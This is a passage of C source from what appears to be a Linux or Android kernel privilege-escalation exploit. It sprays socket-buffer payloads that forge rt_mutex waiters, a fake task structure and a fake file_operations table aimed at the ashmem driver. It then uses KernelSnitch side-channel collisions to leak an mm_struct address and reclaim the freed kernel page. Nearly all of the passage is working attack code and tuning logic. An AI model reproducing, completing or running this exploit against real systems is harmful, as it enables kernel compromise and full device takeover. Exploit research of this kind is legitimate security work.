    task_group = 0;
    pi_top_task = fake_task;
#else
    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
#endif
    waiter_prio = SLIDE_FAKE_WAITER_PRIO;
  }

  uintptr_t tree_parent = 1;
  uintptr_t tree_right = 0;
  uintptr_t tree_left = 0;
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /*
     * Ownerless chain walks stop before rt_mutex_dequeue_pi(), but they still
     * execute rt_mutex_dequeue(lock, waiter) on waiter->tree_entry.  Put the
     * target geometry there so the non-owner path can install fake_fops without
     * touching fake_task->pi_waiters.
     */
    tree_parent = write_pc;
    tree_right = write_right;
    tree_left = 0;
  }
#endif

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      size_t scratch_raw_off = SCRATCH_OFF;
#if defined(PSELECT_RECLAIM_RAW_KVA_BIAS)
      scratch_raw_off += PSELECT_RECLAIM_RAW_KVA_BIAS;
#endif
      put64(p, scratch_raw_off,
#if defined(PSELECT_STALE_TREE_REPLACEMENT_DIAG) && \
    PSELECT_STALE_TREE_REPLACEMENT_DIAG
            0x4141414141414141ULL
#else
            fake_fops
#endif
      );
#if defined(PSELECT_TCP_OOB_LEAF_DIAG) && PSELECT_TCP_OOB_LEAF_DIAG
      /* word 0 of rb_node is __rb_parent_color, so the forged parent is
       * SCRATCH_OFF-8.  Keep parent->rb_left unequal to the later waiter-thread
       * node, forcing __rb_change_child() through rb_right at SCRATCH_OFF.
       * A successful erase must therefore zero the in-payload marker there. */
      put64(p, scratch_raw_off + 8, 0);
#endif
    }
#endif

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE && \
    defined(FOPS_TREEWRITE_NULL_LEFTMOST) && FOPS_TREEWRITE_NULL_LEFTMOST
      if (payload_mode == PAGE_PAYLOAD_FOPS) {
        put64(p, LOCK_OFF + 0x10, 0);
      } else
#endif
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
#if RT_MUTEX_WAITERS_OFF != 0x08
      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF, fake_w0);
      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF + 0x08, fake_w0);
#endif
#if RT_MUTEX_OWNER_OFF != 0x18
      put64(p, LOCK_OFF + RT_MUTEX_OWNER_OFF, SLIDE_LOCK_OWNER_VALUE);
#endif
    } else {
      uint64_t lock_owner = fake_task | 1;
#if defined(FOPS_RECLAIM_OWNERLESS_DIAG) && FOPS_RECLAIM_OWNERLESS_DIAG
      if (payload_mode == PAGE_PAYLOAD_FOPS) {
        lock_owner = 0;
      }
#endif
#if defined(FOPS_LOCK_OWNER_INIT_TASK) && FOPS_LOCK_OWNER_INIT_TASK
      lock_owner = text_addr(INIT_TASK) | 1;
#endif
#if defined(LEGACY_DIAG_LOCK_OWNER) && LEGACY_DIAG_LOCK_OWNER
      lock_owner = LEGACY_DIAG_LOCK_OWNER;
#endif
      uint64_t lock_root = fake_w0;
#if defined(PERF_CURRENT_STACK_WAITER) && PERF_CURRENT_STACK_WAITER && \
    (!defined(FOPS_LOCK_ROOT_CURRENT_STACK_WAITER) || \
     FOPS_LOCK_ROOT_CURRENT_STACK_WAITER)
      if (payload_mode == PAGE_PAYLOAD_FOPS && runtime_waiter_stack_waiter) {
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
        /* In the OOB leaf diagnostic the stale node is red and childless.
         * rb_erase replaces it with NULL at SCRATCH_OFF, then the mandatory
         * re-enqueue inserts the live stack waiter into this empty tree. */
#if defined(PSELECT_TCP_OOB_LEAF_DIAG) && PSELECT_TCP_OOB_LEAF_DIAG
        lock_root = 0;
#else
        lock_root = payload_base + RIGHT_OFF;
#endif
#else
        lock_root = runtime_waiter_stack_waiter;
#endif
      }
#endif
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE && \
    defined(FOPS_TREEWRITE_NULL_ROOT) && FOPS_TREEWRITE_NULL_ROOT
      if (payload_mode == PAGE_PAYLOAD_FOPS) {
        lock_root = 0;
      }
#endif
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE && \
    defined(FOPS_TREEWRITE_SENTINEL_ROOT) && FOPS_TREEWRITE_SENTINEL_ROOT
      if (payload_mode == PAGE_PAYLOAD_FOPS) {
        lock_root = payload_base + RIGHT_OFF;
      }
#endif
      put64(p, LOCK_OFF + 0x08, lock_root);
      put64(p, LOCK_OFF + 0x10,
#if defined(PERF_CURRENT_STACK_WAITER) && PERF_CURRENT_STACK_WAITER && \
    (!defined(FOPS_LOCK_ROOT_CURRENT_STACK_WAITER) || \
     FOPS_LOCK_ROOT_CURRENT_STACK_WAITER)
            payload_mode == PAGE_PAYLOAD_FOPS && runtime_waiter_stack_waiter
                ? runtime_waiter_stack_waiter
                : fake_w0
#else
            fake_w0
#endif
      );
      put64(p, LOCK_OFF + 0x18, lock_owner);
#if RT_MUTEX_WAITERS_OFF != 0x08
      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF, lock_root);
      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF + 0x08, fake_w0);
#endif
#if RT_MUTEX_OWNER_OFF != 0x18
      put64(p, LOCK_OFF + RT_MUTEX_OWNER_OFF, lock_owner);
#endif
#if defined(PSELECT_PAIRED_LOCK_BASE_DIAG) && PSELECT_PAIRED_LOCK_BASE_DIAG
      if (payload_mode == PAGE_PAYLOAD_FOPS) {
        /* If raw byte zero maps 0x40 above the -0xec0 candidate, waiter.lock
         * lands on this alternate lock at raw LOCK_OFF-0x40.  Both candidates
         * are empty and ownerless, so either result is a bounded insertion. */
        put32(p, LOCK_OFF - 0x40, 0);
        put64(p, LOCK_OFF - 0x38, 0);
        put64(p, LOCK_OFF - 0x30, 0);
        put64(p, LOCK_OFF - 0x28, 0);
        put64(p, LOCK_OFF + 0x08, 0);
        put64(p, LOCK_OFF + 0x10, 0);
        put64(p, LOCK_OFF + 0x18, 0);
      }
#endif
    }

    put_fake_waiter(p, W0_OFF, tree_parent, tree_right, tree_left,
                    write_pc, write_right, write_left, waiter_task,
                    fake_lock, waiter_prio);

#if LEGACY_RT_MUTEX_WAITER
#if !defined(FOPS_OWNERLESS_TREE_WRITE) || !FOPS_OWNERLESS_TREE_WRITE
    put64(p, W0_OFF + 0x00, 1);
#endif
#endif

    memset(p + FAKE_TASK_OFF, 0, FAKE_TASK_PI_BLOCKED_ON_OFF + 16);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    if (payload_mode != PAGE_PAYLOAD_FOPS
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE
        || 1
#endif
#if defined(FOPS_FAKE_TASK_TASK_GROUP) && FOPS_FAKE_TASK_TASK_GROUP
        || payload_mode == PAGE_PAYLOAD_FOPS
#endif
       ) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    }
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
#if defined(FOPS_FAKE_TASK_PI_WAITERS) && FOPS_FAKE_TASK_PI_WAITERS
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
#else
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
#endif
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    /* owner-side [11] calls rt_mutex_adjust_prio() after the fake waiter's
     * pi-tree erase.  Keep the cached donor equal to the newly inserted
     * stack waiter's task so rt_mutex_setprio() takes its documented early
     * return before dereferencing fake rq/sched-class state. */
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    if (chunk == 0 && payload_mode == PAGE_PAYLOAD_FOPS) {
      uint64_t emitted_pi_top = 0;
      uint64_t emitted_task_group = 0;
      memcpy(&emitted_pi_top,
             p + FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
             sizeof(emitted_pi_top));
      memcpy(&emitted_task_group,
             p + FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF,
             sizeof(emitted_task_group));
      pr_info("fops fake-task emitted prio=%u pi_top=%016llx "
              "task_group=%016llx\n",
              FAKE_TASK_PRIO, (unsigned long long)emitted_pi_top,
              (unsigned long long)emitted_task_group);
    }


    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put32(p, RIGHT_OFF + FAKE_WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, RIGHT_OFF + FAKE_WAITER_DEADLINE_OFF, 0);
#if defined(PSELECT_STALE_TREE_REPLACEMENT_DIAG) && \
    PSELECT_STALE_TREE_REPLACEMENT_DIAG && \
    defined(PSELECT_RECLAIM_RAW_KVA_BIAS)
      /*
       * The socket bytes observed at raw offset N back payload KVA N-bias.
       * The replacement child pointer names payload_base+RIGHT_OFF, so place
       * its complete waiter at raw RIGHT_OFF+bias.  Initializing only the
       * unshifted copy leaves the kernel-visible waiter with prio 0 and a NULL
       * task, which can make it the top waiter and panic after rb_erase().
       */
      put_fake_waiter(
          p, RIGHT_OFF + PSELECT_RECLAIM_RAW_KVA_BIAS,
          0, 0, 0, 0, 0, 0,
          runtime_waiter_task ? runtime_waiter_task : text_addr(INIT_TASK),
          fake_lock, FAKE_WAITER_PRIO);
#endif
    }
#endif
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE && \
    defined(FOPS_TREEWRITE_SAFE_RBNEXT_WAITER) && \
    FOPS_TREEWRITE_SAFE_RBNEXT_WAITER
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, RIGHT_OFF + FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK));
      put64(p, RIGHT_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, RIGHT_OFF + FAKE_WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, RIGHT_OFF + FAKE_WAITER_DEADLINE_OFF, 0);
    }
#endif

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_TABLE_MIRROR_OFF)
      /*
       * Hardware reads the marker emitted at payload offset 0xe80 at page
       * offset zero, while the stable PI geometry deliberately addresses the
       * reclaimed payload with SKB_DATA_DELTA=-0x1000.  Keep that proven
       * geometry and mirror only the file_operations bytes across the 0x180
       * gap.  The primary copy remains for the page-aligned interpretation.
       */
      put_fake_fops_table(p, APP_FOPS_TABLE_MIRROR_OFF);
#endif
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_GATE_SLOT,
          slide_bank_parents[P0_ORACLE_GATE_SLOT],
          slide_bank_targets[P0_ORACLE_GATE_SLOT]);
      put_slide_bank_entry(
          p, payload_base, P0_ORACLE_PROBE_SLOT,
          slide_bank_parents[P0_ORACLE_PROBE_SLOT],
          slide_bank_targets[P0_ORACLE_PROBE_SLOT]);
#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
      if (fops_data_probe_active) {
        memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
        for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
          put_slide_bank_entry(p, payload_base, slot,
                               slide_bank_parents[slot],
                               slide_bank_targets[slot]);
        }
      } else {
        put_slide_bank_entry(p, payload_base, 0,
                             slide_bank_parents[0],
                             slide_bank_targets[0]);
      }
#else
      put_slide_bank_entry(p, payload_base, 0,
                           slide_bank_parents[0],
                           slide_bank_targets[0]);
#endif
#endif
    }
  }
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    pr_info("fops payload base=%016zx lock=%016zx waiter=%016zx "
            "task=%016zx waiter_task=%016zx fops=%016zx target=%016zx owner=%016zx "
            "resident_prio=%u\n",
            payload_base, fake_lock, fake_w0, fake_task, waiter_task, fake_fops,
            data_addr(ASHMEM_MISC_FOPS),
#if defined(FOPS_RECLAIM_OWNERLESS_DIAG) && FOPS_RECLAIM_OWNERLESS_DIAG
            (uintptr_t)0,
#else
            fake_task | 1,
#endif
            waiter_prio);
  }
#if defined(FOPS_PAYLOAD_LAYOUT_DIAG) && FOPS_PAYLOAD_LAYOUT_DIAG
    uint64_t dbg_lock08 = 0;
    uint64_t dbg_lock10 = 0;
    uint64_t dbg_lock18 = 0;
    uint64_t dbg_lock_waiters = 0;
    uint64_t dbg_lock_leftmost = 0;
    uint64_t dbg_lock_owner = 0;
    memcpy(&dbg_lock08, skb_buf + LOCK_OFF + 0x08, sizeof(dbg_lock08));
    memcpy(&dbg_lock10, skb_buf + LOCK_OFF + 0x10, sizeof(dbg_lock10));
    memcpy(&dbg_lock18, skb_buf + LOCK_OFF + 0x18, sizeof(dbg_lock18));
    memcpy(&dbg_lock_waiters, skb_buf + LOCK_OFF + RT_MUTEX_WAITERS_OFF,
           sizeof(dbg_lock_waiters));
    memcpy(&dbg_lock_leftmost,
           skb_buf + LOCK_OFF + RT_MUTEX_WAITERS_OFF + 0x08,
           sizeof(dbg_lock_leftmost));
    memcpy(&dbg_lock_owner, skb_buf + LOCK_OFF + RT_MUTEX_OWNER_OFF,
           sizeof(dbg_lock_owner));
    pr_info("fops lock layout off_waiters=%x off_owner=%x q08=%016llx "
            "q10=%016llx q18=%016llx waiters=%016llx leftmost=%016llx "
            "owner_slot=%016llx\n",
            RT_MUTEX_WAITERS_OFF, RT_MUTEX_OWNER_OFF,
            (unsigned long long)dbg_lock08,
            (unsigned long long)dbg_lock10,
            (unsigned long long)dbg_lock18,
            (unsigned long long)dbg_lock_waiters,
            (unsigned long long)dbg_lock_leftmost,
            (unsigned long long)dbg_lock_owner);
#endif
  return 1;
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static void cleanup_failed_kernel_page(const char *reason) {
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
  kernelsnitch_cleanup(ks);
  ks = NULL;
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch done\n", reason);
  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
          reason, prepare_ctx.mm_cnt);
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
  }
  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
  cleanup_page_prepare_state();
}
#endif

uintptr_t prepare_kernel_page(int payload_mode) {
  log_mm_slabinfo_port("before-prepare");
  close_reclaim_sockets();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  cleanup_page_prepare_state();
#endif
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  pin_to_core(CORE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
  size_t search_min_object_index = APP_FOPS_MIN_OBJECT_INDEX;
  size_t search_max_object_index = mm_objs_per_slab - 1;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
    search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
  }
  kernelsnitch_set_search_bounds(
      ks, KERNELSNITCH_IDENTITY_START,
      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
      search_min_object_index, search_max_object_index,
      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
#endif
  configure_kernelsnitch_profile(ks, payload_mode);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0); /* DIAG */
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    kernelsnitch_set_profile(
        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
        SLIDE_KSNITCH_AVERAGE);
  }
#endif
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  log_mm_slabinfo("after-child-exit");
#endif

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("collision");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("mm-leak");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  leaked = canonicalize_kernelsnitch_pointer(leaked);
  log_mm_slabinfo("after-leak");
#endif

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, object_index);
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fops_leaked_mm = leaked;
  }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_RECLAIM_MAX_DIRECT_BASE)
  if (base >= APP_RECLAIM_MAX_DIRECT_BASE) {
    pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
               payload_mode, base,
               (unsigned long long)APP_RECLAIM_MAX_DIRECT_BASE);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_SLIDE_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
               object_index, APP_SLIDE_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_SLIDE_MAX_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index > APP_SLIDE_MAX_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
               object_index, APP_SLIDE_MAX_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index < APP_FOPS_MIN_OBJECT_INDEX) {
    pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
               object_index, APP_FOPS_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(FOPS_MIN_OBJECT_INDEX)
  size_t fops_min_object_index = FOPS_MIN_OBJECT_INDEX;
  (void)env_size_t_override("FOPS_MIN_OBJECT_INDEX_RUNTIME",
                            &fops_min_object_index);
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index < fops_min_object_index) {
    pr_warning("mm fops candidate rejected object_index=%zu min=%zu\n",
               object_index, fops_min_object_index);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#endif
#if defined(FOPS_MIN_OBJECT_INDEX) && \
    (!defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION)
  size_t fops_min_object_index = FOPS_MIN_OBJECT_INDEX;
  (void)env_size_t_override("FOPS_MIN_OBJECT_INDEX_RUNTIME",
                            &fops_min_object_index);
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index < fops_min_object_index) {
    pr_warning("mm fops candidate rejected object_index=%zu min=%zu\n",
               object_index, fops_min_object_index);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(FOPS_MAX_OBJECT_INDEX)
  size_t fops_max_object_index = FOPS_MAX_OBJECT_INDEX;
  (void)env_size_t_override("FOPS_MAX_OBJECT_INDEX_RUNTIME",
                            &fops_max_object_index);
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index > fops_max_object_index) {
    pr_warning("mm fops candidate rejected object_index=%zu max=%zu\n",
               object_index, fops_max_object_index);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(FOPS_REJECT_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index == FOPS_REJECT_OBJECT_INDEX) {
    pr_warning("mm fops candidate rejected object_index=%zu reject=%d\n",
               object_index, FOPS_REJECT_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(FOPS_REJECT_OBJECT_INDEX_2)
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index == FOPS_REJECT_OBJECT_INDEX_2) {
    pr_warning("mm fops candidate rejected object_index=%zu reject=%d\n",
               object_index, FOPS_REJECT_OBJECT_INDEX_2);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
  int fops_allowlist_configured = 0;
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      !env_size_t_list_contains("FOPS_OBJECT_INDEX_ALLOWLIST_RUNTIME",
                                object_index,
                                &fops_allowlist_configured) &&
      fops_allowlist_configured) {
    pr_warning("mm fops candidate rejected object_index=%zu allowlist=%s\n",
               object_index, getenv("FOPS_OBJECT_INDEX_ALLOWLIST_RUNTIME"));
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  if (!prepare_skb_payload(base, payload_mode)) {
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("skb-payload");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

#if !(defined(LEGACY_KEEP_KSNITCH_UNTIL_RECLAIM) && \
      LEGACY_KEEP_KSNITCH_UNTIL_RECLAIM)
  kernelsnitch_cleanup(ks);
  ks = NULL;
#endif

#if defined(LEGACY_PREKILL_PREPARE_CHILDREN) && \
    LEGACY_PREKILL_PREPARE_CHILDREN
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
    prepare_ctx.childs[i] = -1;
  }
#endif

  int sndbuf;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
#ifdef APP_SLIDE_RECLAIM_SNDBUF
    sndbuf = APP_SLIDE_RECLAIM_SNDBUF;
#else
    sndbuf = 1 << 20;
#endif
  } else {
#ifdef LEGACY_RECLAIM_SNDBUF
